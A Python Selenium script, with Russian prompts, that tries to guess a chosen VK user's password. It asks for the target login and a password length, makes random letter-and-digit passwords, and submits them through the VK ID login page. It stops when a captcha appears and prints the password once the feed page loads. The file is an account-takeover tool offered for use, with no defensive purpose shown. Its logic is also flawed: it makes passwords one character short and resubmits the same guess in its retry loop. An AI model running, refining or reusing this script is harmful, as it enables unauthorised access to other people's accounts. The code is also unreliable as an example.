import time
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
import random



log = input('Логин пользователя: ')

PassSymbols = int(input('кол-во символов пароля пользователя: '))


PassList = ['1','2']
x = 2




driver = webdriver.Chrome(ChromeDriverManager().install())
options = webdriver.ChromeOptions()
driver = webdriver.Chrome(executable_path=r"C:/Windows/chromedriver.exe",options = options)
driver.get('https://id.vk.com/auth?app_id=7913379&v=1.46.0&redirect_uri=https%3A%2F%2Fvk.com%2Ffeed&uuid=ixfnLNGKBVnprqp3V361j&action=eyJuYW1lIjoibm9fcGFzc3dvcmRfZmxvdyIsInBhcmFtcyI6eyJ0eXBlIjoic2lnbl9pbiJ9fQ%3D%3D')

link = driver.current_url


pas2 = ''
cyclik = 1
while cyclik > 0:
    for x in range(1, PassSymbols): #Количество символов ( создано из кол-во символов в пароле )
        pas = random.choice(list('1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ')) #Символы, из которых будет составлен пароль
        pas2 = pas2 + pas
    print (pas2)

    for i in range(0, len(PassList)-1):
        if pas2 == PassList[i]:
            pas2 = ''
            cyclik = cyclik + 1
        else:
            cyclik = 0
    time.sleep(0.01)

PassList.append(pas2)

print (pas2)
driver.get('https://id.vk.com/auth?app_id=7913379&v=1.46.0&redirect_uri=https%3A%2F%2Fvk.com%2Ffeed&uuid=ixfnLNGKBVnprqp3V361j&action=eyJuYW1lIjoibm9fcGFzc3dvcmRfZmxvdyIsInBhcmFtcyI6eyJ0eXBlIjoic2lnbl9pbiJ9fQ%3D%3D')
time.sleep(2)
for i in range(1):
    try:
        driver.find_element_by_class_name('vkc__Captcha__image')
        print("Встречена капча")
        print()
        input("press any key to exit ...")
        x = 0
        break
    except:
        s_username = driver.find_element_by_class_name('vkc__TextField__input')
        s_username.send_keys(log)
    try:
        driver.find_element_by_class_name('vkc__Captcha__image')
        print("Встречена капча")
        print()
        input("press any key to exit ...")
        x = 0
        break
    except:
        s_con = driver.find_element_by_class_name('vkc__Button__container')
        s_con.click()
        time.sleep(2)
    try:
        driver.find_element_by_class_name('vkc__Captcha__image')
        print("Встречена капча")
        print()
        input("press any key to exit ...")
        x = 0
        break
    except:
        time.sleep(2)
        s_password = driver.find_element_by_name('password')
        s_password.send_keys(pas2)
    try:
        driver.find_element_by_class_name('vkc__Captcha__image')
        print("Встречена капча")
        print()
        input("press any key to exit ...")
        x = 0
        break
    except:
        time.sleep(2)
        s_continue = driver.find_element_by_class_name('vkc__Button__title')
        s_continue.click()
    try:
        driver.find_element_by_class_name('vkc__Captcha__image')
        print("Встречена капча")
        print()
        input("press any key to exit ...")
        x = 0
        break
    except:
        time.sleep(2)

while x > 1:
    try:
        driver.find_element_by_class_name('vkc__Captcha__image')
        print("Встречена капча")
        print()
        input("press any key to exit ...")
        x = 0
        break
    except:
        time.sleep(2)
        s_password = driver.find_element_by_name('password')
        s_password.clear()
        s_password.send_keys(pas2)
    try:
        driver.find_element_by_class_name('vkc__Captcha__image')
        print("Встречена капча")
        print()
        input("press any key to exit ...")
        quit()
        break
    except:
        time.sleep(2)
        s_continue = driver.find_element_by_class_name('vkc__Button__title')
        s_continue.click()
    try:
        driver.find_element_by_class_name('vkc__Captcha__image')
        print("Встречена капча")
        print()
        input("press any key to exit ...")
        quit()
        break
    except:
        time.sleep(2)

    link = driver.current_url

    print(link)

    if ("https://vk.com/feed" in link):

        print("password: " + pas2)
        print("password: " + pas2)
        print("password: " + pas2)
        print("password: " + pas2)
        print("password: " + pas2)
        print("password: " + pas2)
        time.sleep(99999999999999999)
        x = 0
    else:
        PassList.append(pas2)
        x = x + 1
        time.sleep(0.01)



